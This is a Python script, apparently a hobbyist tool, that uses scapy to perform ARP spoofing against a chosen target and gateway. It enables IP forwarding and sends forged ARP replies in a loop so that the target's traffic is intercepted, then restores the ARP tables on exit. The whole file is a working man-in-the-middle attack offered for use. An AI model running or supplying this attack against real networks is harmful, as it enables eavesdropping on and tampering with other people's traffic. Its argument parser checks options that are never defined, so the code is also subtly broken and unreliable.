import scapy.all as scapy
import time
import subprocess
import argparse

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	final_packet = broadcast/arp_request
	answered_list = scapy.srp(final_packet, timeout=1, verbose=False)[0]
	
	return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	target_mac=get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
	destination_mac= get_mac(destination_ip)
	source_mac=get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet,count=4, verbose=False)

def get_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", "--target", dest="target_ip", help="Input the target system's IP")
	parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Input the gateway IP")
	options = parser.parse_args()
	if not options.interface:
		parser.error("please enter an interface value (Use --help to know more)")
	elif not options.new_mac_address:
		parser.error("please enter the new MAC value (Use --help to know more)")
	return options

#the next part below will execute a command to ensure that packets get forwarded from our system
#i.e. client has access to internet and result sent by server and vice versa
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
#if you are facing issues please remove this part of the code and manually run the above command once

options=get_arguments()

target_ip=options.target_ip
gateway_ip=options.gateway_ip

sent_packet_count = 0
try:
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		sent_packet_count = sent_packet_count + 2
		print("\r Packets sent: "+ str(sent_packet_count), end="")
		#if using python2 remove end="", outside both closing bracket )) put a comma ","
		#import sys module and put the code "sys.stdout.flush()" in the next line to this print statement
		time.sleep(2) #loop will execute with a delay of 2 second
except KeyboardInterrupt:
	print("Ctrl+C input detected...Resetting ARP tables...Please wait!")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)
	print("Restore Successful...Aborting Program Now!")